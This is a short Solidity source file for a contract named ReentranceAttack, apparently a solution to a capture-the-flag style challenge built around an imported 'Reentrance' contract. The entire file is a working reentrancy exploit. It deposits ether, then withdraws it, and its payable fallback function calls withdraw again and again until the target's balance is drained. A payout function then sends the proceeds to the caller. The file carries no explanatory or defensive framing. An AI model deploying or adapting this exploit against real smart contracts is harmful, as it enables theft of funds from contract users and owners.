pragma solidity ^0.4.18;

import "Reentrance.sol";

contract ReentranceAttack {
    
    Reentrance public addr;
    uint public stepSize;
    
    function ReentranceAttack(address _addr) public payable {
        addr = Reentrance(_addr);
    }
    
    function go() public {
        // Deposit max(this.balance, _addr.balance) to the contract so we can retrieve as much as possible per call
        if(this.balance > addr.balance){
            stepSize = addr.balance;
        }
        else{
            stepSize = this.balance;
        }
        addr.donate.value(stepSize)(address(this));
        
        // Request a withdrawl of all our funds, and then the fallback method will take over to get the rest of the funds
        addr.withdraw(stepSize);
    }
    
    function() external payable {
        if(addr.balance > stepSize){
            addr.withdraw(stepSize);
        }
        else if(addr.balance > 0){
            addr.withdraw(addr.balance);
        }
    }
    
    function payout() public {
        msg.sender.transfer(this.balance);
    }
}